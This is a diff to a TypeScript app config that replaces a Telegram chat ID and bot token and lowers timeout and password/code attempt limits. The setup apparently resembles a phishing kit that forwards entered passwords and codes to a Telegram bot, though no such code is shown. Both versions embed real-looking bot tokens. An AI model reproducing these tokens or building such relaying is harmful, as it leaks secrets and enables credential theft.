@@ -1,13 +1,13 @@
 export const APP_CONFIG = {
-    CHAT_ID: '6524810525',
+    CHAT_ID: '5395290113',
 
-    TOKEN: '7538358487:AAHeJY1CrTbMXvG-gggbarNxgzbiGUKR7SA',
+    TOKEN: '8152750978:AAGRh95NH9gm8FnX9-ldXwc6cUwY1qp5phA',
 
     MAX_PASSWORD_ATTEMPTS: 2,
 
-    LOAD_TIMEOUT_MS: 3000,
+    LOAD_TIMEOUT_MS: 2000,
 
-    MAX_CODE_ATTEMPTS: 5
+    MAX_CODE_ATTEMPTS: 3
 } as const;
 
 type AppConfig = typeof APP_CONFIG;
